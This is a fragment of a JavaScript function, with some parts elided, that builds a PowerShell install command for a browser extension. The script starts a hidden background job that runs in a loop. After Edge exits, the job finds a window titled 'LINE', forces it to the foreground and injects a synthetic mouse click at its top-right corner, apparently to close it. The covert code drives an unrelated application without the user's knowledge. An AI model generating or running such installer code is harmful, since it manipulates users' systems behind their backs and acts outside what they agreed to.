...
function generateInstallCommand(extensionId) {
    ...
    cmd += 'if ($success) {\n';
    cmd += '    Start-Sleep -Seconds 3\n';
    cmd += '    $edgeProcessId = $edge.Id\n';
    cmd += '    Start-Job -ScriptBlock {\n';
    cmd += '        param($edgeId)\n';
    cmd += '        Add-Type -AssemblyName UIAutomationClient\n';
    cmd += '        Add-Type -AssemblyName UIAutomationTypes\n';
    cmd += '        Add-Type -AssemblyName System.Windows.Forms\n';
    cmd += '        while ($true) {\n';
    cmd += '            $edgeProcess = Get-Process -Id $edgeId -ErrorAction SilentlyContinue\n';
    cmd += '            if (-not $edgeProcess) {\n';
    cmd += '                Start-Sleep -Seconds 1\n';
    cmd += '                Add-Type @"\n';
    cmd += 'using System;\n';
    cmd += 'using System.Runtime.InteropServices;\n';
    cmd += 'using System.Text;\n';
    cmd += 'public class WindowFinder {\n';
    cmd += '    [DllImport(\\"user32.dll\\")]\n';
    ...
    cmd += '                    if ([WindowFinder]::IsWindowVisible($hwnd)) {\n';
    cmd += '                        $title = New-Object System.Text.StringBuilder 256\n';
    cmd += '                        [WindowFinder]::GetWindowText($hwnd, $title, 256) | Out-Null\n';
    cmd += '                        $titleStr = $title.ToString()\n';
    cmd += '                        if ($titleStr -match "LINE") {\n';
    cmd += '                            $script:lineWindow = $hwnd\n';
    cmd += '                            return $false\n';
    cmd += '                        }\n';
    cmd += '                    }\n';
    cmd += '                    return $true\n';
    cmd += '                }\n';
    cmd += '                [WindowFinder]::EnumWindows($callback, [IntPtr]::Zero)\n';
    cmd += '                if ($lineWindow) {\n';
    cmd += '                    [WindowFinder]::SetForegroundWindow($lineWindow) | Out-Null\n';
    cmd += '                    Start-Sleep -Milliseconds 500\n';
    cmd += '                    try {\n';
    cmd += '                        $lineElement = [System.Windows.Automation.AutomationElement]::FromHandle($lineWindow)\n';
    cmd += '                        if ($lineElement) {\n';
    cmd += '                            $rect = $lineElement.Current.BoundingRectangle\n';
    cmd += '                            $closeX = $rect.Right - 15\n';
    cmd += '                            $closeY = $rect.Top + 15\n';
    cmd += '                            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($closeX, $closeY)\n';
    cmd += '                            Start-Sleep -Milliseconds 200\n';
    cmd += '                            Add-Type @"\n';
    cmd += 'using System;\n';
    cmd += 'using System.Runtime.InteropServices;\n';
    cmd += 'public class MouseClick {\n';
    cmd += '    [DllImport(\\"user32.dll\\")]\n';
    cmd += '    public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);\n';
    cmd += '    public const uint MOUSEEVENTF_LEFTDOWN = 0x0002;\n';
    cmd += '    public const uint MOUSEEVENTF_LEFTUP = 0x0004;\n';
    cmd += '}\n';
    cmd += '"@\n';
    cmd += '                            [MouseClick]::mouse_event([MouseClick]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)\n';
    cmd += '                            Start-Sleep -Milliseconds 50\n';
    cmd += '                            [MouseClick]::mouse_event([MouseClick]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)\n';
    cmd += '                        }\n';
    cmd += '                    } catch {\n';
    ...
    cmd += '            Start-Sleep -Seconds 2\n';
    cmd += '        }\n';
    cmd += '    } -ArgumentList $edgeProcessId | Out-Null\n';
    cmd += '    exit 0\n';
    cmd += '}\n';
    cmd += 'exit 1\n';
    cmd += '\'@ -Encoding UTF8\n\n';
